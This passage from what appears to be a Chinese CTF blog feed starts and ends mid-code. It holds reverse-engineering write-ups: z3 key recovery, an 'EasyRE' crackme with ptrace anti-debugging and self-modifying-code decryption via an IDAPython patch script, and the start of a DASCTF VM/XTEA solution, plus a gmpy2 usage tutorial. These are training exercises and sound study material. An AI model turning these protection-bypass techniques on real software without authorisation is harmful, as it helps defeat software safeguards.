class="hljs-number">8</span> == <span class="hljs-number">0</span>:<br>        num += <span class="hljs-number">1</span><br>    key[num] = ((key[num] &lt;&lt; <span class="hljs-number">1</span>) | ((z &gt;&gt; <span class="hljs-number">32</span> &amp; <span class="hljs-number">1</span> &amp; (x &gt;&gt; <span class="hljs-number">30</span> &amp; <span class="hljs-number">1</span>))<br>                ^ (((z &gt;&gt; <span class="hljs-number">32</span> &amp; <span class="hljs-number">1</span>) ^ <span class="hljs-number">1</span>) &amp; (y &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>)))) &amp; <span class="hljs-number">0xff</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    s.add(key[i] == enc[i])<br><br><span class="hljs-keyword">if</span> s.check() == sat:<br>    <span class="hljs-built_in">print</span>(s.model())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)<br><br><span class="hljs-comment"># y = 868387187</span><br><span class="hljs-comment"># x = 156324965</span><br><span class="hljs-comment"># z = 3131229747</span><br><br><br>L = [<span class="hljs-number">156324965</span>, <span class="hljs-number">868387187</span>, <span class="hljs-number">3131229747</span>]<br>key = [<span class="hljs-number">0</span>]*<span class="hljs-number">12</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        key[i * <span class="hljs-number">4</span> + j] = (L[i] &gt;&gt; j * <span class="hljs-number">8</span> &amp; <span class="hljs-number">255</span>)<br><br>array5 = [<span class="hljs-number">60</span>,<span class="hljs-number">100</span>,<span class="hljs-number">36</span>,<span class="hljs-number">86</span>,<span class="hljs-number">51</span>,<span class="hljs-number">251</span>,<span class="hljs-number">167</span>,<span class="hljs-number">108</span>,<span class="hljs-number">116</span>,<span class="hljs-number">245</span>,<span class="hljs-number">207</span>,<span class="hljs-number">223</span>,<span class="hljs-number">40</span>,<span class="hljs-number">103</span>,<span class="hljs-number">34</span>,<span class="hljs-number">62</span>,<span class="hljs-number">22</span>,<span class="hljs-number">251</span>,<span class="hljs-number">227</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(array5)):<br>    array5[i] ^= key[i % <span class="hljs-built_in">len</span>(key)]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(array5[i]),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>之后就可以直接得到<code>flag</code>啦 ~</p><h2 id="EasyRE">EasyRE</h2><p>又是一个说自己<code>easy</code>的题目，<code>CTF</code>里面的<code>easy</code>以及<code>baby</code>的题目都不能相信，基本上就是<code>不easy</code>和<code>卑鄙</code>了，当然或许有些题是真的<code>easy</code>以及<code>baby</code>难度</p><p>拿到程序我们将其拖入<code>IDA</code>中，可以看到程序去除了对应的符号表，显得每一个函数十分的难看，这里我们借助一下<code>Finger</code>插件进行恢复一下符号，之后我们可以快速的找到程序的主函数</p><p><img src="https://s2.loli.net/2022/08/06/L759FKZ3JsdwcyT.png" alt="1.png"></p><p>可以看到程序创建了一个子进程<code>re3</code>，我们将写完的程序进行提出来，我们将其拖入进<code>IDA</code>可以发现有大量红色的未反编译出的函数，我们手动修复的同时可以发现在一处出现了我们父进程的那两个数字<code>0xCAFEB055</code>和<code>0xCAFE1055</code>，同时中间的大部分数据无法还原，因此猜测可能是一个<code>SMC</code></p><p><img src="https://s2.loli.net/2022/08/06/M3vsg8kZJXLaHOD.png" alt="3.png"></p><p>我们此时回到父进程进行观察那个循环中<code>if</code>语句对应的操作</p><p><img src="https://s2.loli.net/2022/08/06/qZp9naOx6l5iLI2.png" alt="2.png"></p><p>可以看到函数中存在有<code>sys_ptrace</code>以及两个关键的<code>if</code>判断语句对我们的产生的异常信号进行处理,对于<code>sys_ptrace</code>的一些知识点可以参考</p><blockquote><p><a href="https://bbs.pediy.com/thread-265924.htm#msg_header_h2_1">https://bbs.pediy.com/thread-265924.htm#msg_header_h2_1</a></p></blockquote><p>其中关键的部分在于对于<code>ptrace</code>的一些参数：</p><table><thead><tr><th>Request</th><th>Description</th></tr></thead><tbody><tr><td>PTRACE_TRACEME</td><td>进程被其父进程跟踪，其父进程应该希望跟踪子进程。该值仅被tracee使用，其余的request值仅被tracer使用</td></tr><tr><td>PTRACE_PEEKTEXT, PTRACE_PEEKDATA</td><td>从tracee的addr指定的内存地址中读取一个字节作为ptrace()调用的结果</td></tr><tr><td>PTRACE_PEEKUSER</td><td>从tracee的USER区域中便宜为addr处读取一个字节，该值保存了进程的寄存器和其他信息</td></tr><tr><td>PTRACE_POKETEXT, PTRACE_POKEDATA</td><td>向tracee的addr内存地址处复制一个字节数据</td></tr><tr><td>PTRACE_POKEUSER</td><td>向tracee的USER区域中偏移为addr地址处复制一个字节数据</td></tr><tr><td>PTRACE_GETREGS</td><td>复制tracee的通用寄存器到tracer的data处</td></tr><tr><td>PTRACE_GETFPREGS</td><td>复制tracee的浮点寄存器到tracer的data处</td></tr><tr><td>PTRACE_GETREGSET</td><td>读取tracee的寄存器</td></tr><tr><td>PTRACE_SETREGS</td><td>设置tracee的通用寄存器</td></tr><tr><td>PTRACE_SETFPREGS</td><td>设置tracee的浮点寄存器</td></tr><tr><td>PTRACE_CONT</td><td>重新运行stopped状态的tracee进程</td></tr><tr><td>PTRACE_SYSCALL</td><td>重新运行stopped状态的tracee进程，但是使tracee在系统调用的下一个entry或从系统调用退出或在执行一条指令后stop</td></tr><tr><td>PTRACE_SINGLESTEP</td><td>设置单步执行标志</td></tr><tr><td>PTRACE_ATTACH</td><td>跟踪指定pid的进程</td></tr><tr><td>PTRACE_DETACH</td><td>结束跟踪</td></tr></tbody></table><p>通过这个我们可以还原<code>ptrace</code>函数的操作，我们进入到<code>sub_401BB1</code>函数中，观察可以确定其是一个<code>SMC</code>的解密操作</p><p>对此我们可以通过调试时加入断点，来进行提取对应的异或数据值</p><p><img src="https://s2.loli.net/2022/08/06/CqX1NleSUZ6iGI3.png" alt="4.png"></p><p><img src="https://s2.loli.net/2022/08/06/kLFTCBJMImei3ax.png" alt="5.png"></p><p>对此我们可以得到对应的异或数据</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">[<span class="hljs-number">0x23271ceac9cf88e1</span>, <span class="hljs-number">0x4d9403a34275494c</span>, <span class="hljs-number">0xf1ac2fea63c94ea9</span>, <span class="hljs-number">0xf32554baaf233dcc</span>, <span class="hljs-number">0xad5ea15de7bcf568</span>, <span class="hljs-number">0xabdfc454b2ec9fd0</span>, <span class="hljs-number">0xa5ee2b4680957b2b</span>, <span class="hljs-number">0xaf42f81128b7fb38</span>, <span class="hljs-number">0xca34bde4268cae3</span>, <span class="hljs-number">0x4ee274bc39f2d547</span>, <span class="hljs-number">0x53458e3ea10ab93b</span>, <span class="hljs-number">0x2e5fb32efac34cff</span>, <span class="hljs-number">0x99f8f6faa7a64aec</span>, <span class="hljs-number">0xef38004300eda44d</span>, <span class="hljs-number">0xee67c44e2bcd18fc</span>, <span class="hljs-number">0x9b1c209768ecb41e</span>, <span class="hljs-number">0xfae74344fcba3cdb</span>, <span class="hljs-number">0x62654e739151118d</span>, <span class="hljs-number">0xbfa53d12825ac60</span>, <span class="hljs-number">0x5fda7e9212d8d034</span>, <span class="hljs-number">0xe8e15b2ffd058214</span>, <span class="hljs-number">0x6258db99ec82ff1f</span>, <span class="hljs-number">0xc1f8d40001b68bf6</span>, <span class="hljs-number">0x6211d421f8ab1d50</span>, <span class="hljs-number">0xd25bc129ebbbd366</span>, <span class="hljs-number">0xaea9e2a30d3fcd24</span>, <span class="hljs-number">0x12e2013bc48da1de</span>, <span class="hljs-number">0x1db06bde7ca30286</span>, <span class="hljs-number">0x226499b91812859b</span>, <span class="hljs-number">0xb2b0d80d0f244ce4</span>, <span class="hljs-number">0xfba26ec5f66ad4a5</span>, <span class="hljs-number">0xef4975489b39baa5</span>, <span class="hljs-number">0x75da0adeb0d03511</span>, <span class="hljs-number">0xcbb9c9ef1c68088d</span>, <span class="hljs-number">0xb707f2ec82b077b8</span>, <span class="hljs-number">0x4989b97aadc513bb</span>, <span class="hljs-number">0x74c613b6d47fcde</span>, <span class="hljs-number">0x1d6396837a7ad9d8</span>, <span class="hljs-number">0x7f1a74782535fe54</span>]<br></code></pre></td></tr></table></figure><p>之后我们就可以编写一个<code>IDAPython</code>脚本将我们之前得到的<code>re3</code>手动<code>SMC</code>解密回去</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> ida_bytes<br>xorkey = [<span class="hljs-number">0x23271ceac9cf88e1</span>, <span class="hljs-number">0x4d9403a34275494c</span>, <span class="hljs-number">0xf1ac2fea63c94ea9</span>, <span class="hljs-number">0xf32554baaf233dcc</span>, <span class="hljs-number">0xad5ea15de7bcf568</span>, <span class="hljs-number">0xabdfc454b2ec9fd0</span>, <span class="hljs-number">0xa5ee2b4680957b2b</span>, <span class="hljs-number">0xaf42f81128b7fb38</span>, <span class="hljs-number">0xca34bde4268cae3</span>, <span class="hljs-number">0x4ee274bc39f2d547</span>, <span class="hljs-number">0x53458e3ea10ab93b</span>, <span class="hljs-number">0x2e5fb32efac34cff</span>, <span class="hljs-number">0x99f8f6faa7a64aec</span>, <span class="hljs-number">0xef38004300eda44d</span>, <span class="hljs-number">0xee67c44e2bcd18fc</span>, <span class="hljs-number">0x9b1c209768ecb41e</span>, <span class="hljs-number">0xfae74344fcba3cdb</span>, <span class="hljs-number">0x62654e739151118d</span>, <span class="hljs-number">0xbfa53d12825ac60</span>, <span class="hljs-number">0x5fda7e9212d8d034</span>, <span class="hljs-number">0xe8e15b2ffd058214</span>, <span class="hljs-number">0x6258db99ec82ff1f</span>, <span class="hljs-number">0xc1f8d40001b68bf6</span>, <span class="hljs-number">0x6211d421f8ab1d50</span>, <span class="hljs-number">0xd25bc129ebbbd366</span>, <span class="hljs-number">0xaea9e2a30d3fcd24</span>, <span class="hljs-number">0x12e2013bc48da1de</span>, <span class="hljs-number">0x1db06bde7ca30286</span>, <span class="hljs-number">0x226499b91812859b</span>, <span class="hljs-number">0xb2b0d80d0f244ce4</span>, <span class="hljs-number">0xfba26ec5f66ad4a5</span>, <span class="hljs-number">0xef4975489b39baa5</span>, <span class="hljs-number">0x75da0adeb0d03511</span>, <span class="hljs-number">0xcbb9c9ef1c68088d</span>, <span class="hljs-number">0xb707f2ec82b077b8</span>, <span class="hljs-number">0x4989b97aadc513bb</span>, <span class="hljs-number">0x74c613b6d47fcde</span>, <span class="hljs-number">0x1d6396837a7ad9d8</span>, <span class="hljs-number">0x7f1a74782535fe54</span>]<br>addr = <span class="hljs-number">0x220F</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">39</span>):<br>    data = xorkey[i] ^ ida_bytes.get_qword(addr+<span class="hljs-number">16</span>*i)<br>    ida_bytes.patch_qword(addr+<span class="hljs-number">16</span>*i, data)<br></code></pre></td></tr></table></figure><p>解密完成后将发送<code>int 3</code>指令等传给父进程的数进行<code>patch</code>处理，随后构建函数，通过一定分析我们可以发现这个函数将我们的输入进行保存，随后进行<code>check</code>，经过一些资料的查找发现这个是一个数织游戏，其将我们的数据进行统计<code>1</code>的个数放在第一位，随后进行<code>check</code>我们的输入</p><p>对于求解这个我们需要注意的是，这个静态下直接提取得到的行列数据是有一定问题的，这行与列是在<code>init</code>被相应修改了，我们可以尝试直接调试拿取数据</p><p><img src="https://s2.loli.net/2022/08/06/7VrsQjeJUMoILHG.png" alt="6.png"></p><p>我们将数据提取，可以直接到在线网站进行求解</p><blockquote><p><a href="https://handsomeone.github.io/Nonogram/#advanced-usages">https://handsomeone.github.io/Nonogram/#advanced-usages</a></p></blockquote><p><img src="https://s2.loli.net/2022/08/06/fqDpcu3beXTgGFj.png" alt="7.png"></p>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>gmpy2常见函数使用</title>
    <link href="/2022/08/03/gmpy2%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/08/03/gmpy2%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="初始化大整数">初始化大整数</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> gmpy2<br>gmpy2.mpz(<span class="hljs-number">909090</span>)<br><br>result:mpz(<span class="hljs-number">909090</span>)<br></code></pre></td></tr></table></figure><h2 id="求大整数a-b的最大公因数">求大整数a,b的最大公因数</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> gmpy2<br>gmpy2.gcd(<span class="hljs-number">6</span>,<span class="hljs-number">18</span>)<br><br>result:mpz(<span class="hljs-number">6</span>)<br></code></pre></td></tr></table></figure><h2 id="求大整数x模m的逆元y">求大整数x模m的逆元y</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#4*6 ≡ 1 mod 23</span><br>gmpy2.invert(<span class="hljs-number">4</span>,<span class="hljs-number">23</span>)<br><br>result:mpz(<span class="hljs-number">6</span>)<br></code></pre></td></tr></table></figure><h2 id="检验大整数是否为偶数">检验大整数是否为偶数</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> gmpy2<br>gmpy2.is_even(<span class="hljs-number">6</span>)<br><br>result:<span class="hljs-literal">True</span><br><br>-----------<br><br><span class="hljs-keyword">import</span> gmpy2<br>gmpy2.is_even(<span class="hljs-number">7</span>)<br><br>result:<span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><h2 id="检验大整数是否为奇数">检验大整数是否为奇数</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> gmpy2<br>gmpy2.is_odd(<span class="hljs-number">6</span>)<br><br>result:<span class="hljs-literal">False</span><br><br>-----------<br><br><span class="hljs-keyword">import</span> gmpy2<br>gmpy2.is_odd(<span class="hljs-number">7</span>)<br><br>result:<span class="hljs-literal">True</span><br><br></code></pre></td></tr></table></figure><h2 id="检验大整数是否为素数">检验大整数是否为素数</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> gmpy2<br>gmpy2.is_prime(<span class="hljs-number">5</span>)<br><br>result:<span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><h2 id="求大整数x开n次根">求大整数x开n次根</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> gmpy2<br>gmpy2.iroot(<span class="hljs-number">81</span>,<span class="hljs-number">2</span>)<br><br>result:(mpz(<span class="hljs-number">9</span>),<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h2 id="求大整数x的y次幂模m取余">求大整数x的y次幂模m取余</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#2^4 mod 5 </span><br>gmpy2.powmod(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">15</span>)<br><br>result:mpz(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF 2022.07 E4sy_Mix 复现</title>
    <link href="/2022/07/29/DASCTF%202022.07%20E4sy_Mix%20%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/07/29/DASCTF%202022.07%20E4sy_Mix%20%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>这个题说难似乎也不是很难，但就是十分的麻烦，将<code>虚拟机VM</code>与<code>XTEA魔改</code>进行了结合，同时写对应脚本也比较费时间…总感觉这个题出出来是用来拖Re的解题时间的(可能对于一些佬来说不是)</p><h2 id="加密">加密</h2><p>我们将程序拖入到<code>IDA</code>中可以清晰地看到其加密逻辑，程序分别进行了三个阶段，将我们的输入进行处理 ——&gt; XTEA加密 ——&gt; VM</p><p><img src="https://s2.loli.net/2022/07/29/O26PuaWE4kexjSL.png" alt="1.png"></p><p>因此对于逆向而言我们需要的是先去解密对应的<code>VM</code>虚拟机部分，我们将<code>so</code>文件也拖入进<code>IDA</code>进行反编译</p><p><img src="https://s2.loli.net/2022/07/29/gBX9HhbYWjouyix.png" alt="4.png"></p><p><img src="https://s2.loli.net/2022/07/29/yous6iaYXrTWMGd.png" alt="3.png"></p><p>通过上面的分析我们将每一个<code>func</code>函数进行翻译转换写出对应的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><code class="hljs python">opcode = [<span class="hljs-number">0</span>]*<span class="hljs-number">160</span><br>opcode[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">3</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">4</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">5</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">6</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">7</span>] = <span class="hljs-number">2</span><br>opcode[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">9</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">10</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">11</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">12</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">13</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">15</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">16</span>] = <span class="hljs-number">5</span><br>opcode[<span class="hljs-number">17</span>] = <span class="hljs-number">2</span><br>opcode[<span class="hljs-number">18</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">19</span>] = <span class="hljs-number">6</span><br>opcode[<span class="hljs-number">20</span>] = <span class="hljs-number">30</span><br>opcode[<span class="hljs-number">21</span>] = <span class="hljs-number">12</span><br>opcode[<span class="hljs-number">22</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">23</span>] = <span class="hljs-number">5</span><br>opcode[<span class="hljs-number">24</span>] = <span class="hljs-number">13</span><br>opcode[<span class="hljs-number">25</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">26</span>] = <span class="hljs-number">6</span><br>opcode[<span class="hljs-number">27</span>] = <span class="hljs-number">8</span><br>opcode[<span class="hljs-number">28</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">29</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">30</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">31</span>] = <span class="hljs-number">2</span><br>opcode[<span class="hljs-number">32</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">33</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">34</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">35</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">36</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">37</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">38</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">39</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">40</span>] = <span class="hljs-number">5</span><br>opcode[<span class="hljs-number">41</span>] = <span class="hljs-number">10</span><br>opcode[<span class="hljs-number">42</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">43</span>] = <span class="hljs-number">6</span><br>opcode[<span class="hljs-number">44</span>] = <span class="hljs-number">22</span><br>opcode[<span class="hljs-number">45</span>] = <span class="hljs-number">12</span><br>opcode[<span class="hljs-number">46</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">47</span>] = <span class="hljs-number">5</span><br>opcode[<span class="hljs-number">48</span>] = <span class="hljs-number">13</span><br>opcode[<span class="hljs-number">49</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">50</span>] = <span class="hljs-number">6</span><br>opcode[<span class="hljs-number">51</span>] = <span class="hljs-number">8</span><br>opcode[<span class="hljs-number">52</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">53</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">54</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">55</span>] = <span class="hljs-number">2</span><br>opcode[<span class="hljs-number">56</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">57</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">58</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">59</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">60</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">61</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">62</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">63</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">64</span>] = <span class="hljs-number">5</span><br>opcode[<span class="hljs-number">65</span>] = <span class="hljs-number">18</span><br>opcode[<span class="hljs-number">66</span>] = <span class="hljs-number">1</span><br>opcode[<span class="hljs-number">67</span>] = <span class="hljs-number">6</span><br>opcode[<span class="hljs-number">68</span>] = <span class="hljs-number">14</span><br>opcode[<span class="hljs-number">69</span>] = <span class="hljs-number">12</span><br>opcode[<span class="hljs-number">70</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">71</span>] = <span class="hljs-number">5</span><br>opcode[<span class="hljs-number">72</span>] = <span class="hljs-number">13</span><br>opcode[<span class="hljs-number">73</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">74</span>] = <span class="hljs-number">6</span><br>opcode[<span class="hljs-number">75</span>] = <span class="hljs-number">8</span><br>opcode[<span class="hljs-number">76</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">77</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">78</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">79</span>] = <span class="hljs-number">2</span><br>opcode[<span class="hljs-number">80</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">81</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">82</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">83</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">84</span>] = <span class="hljs-number">3</span><br>opcode[<span class="hljs-number">85</span>] = <span class="hljs-number">4</span><br>opcode[<span class="hljs-number">86</span>] = <span class="hljs-number">0</span><br>opcode[<span class="hljs-number">87</span>] = <span 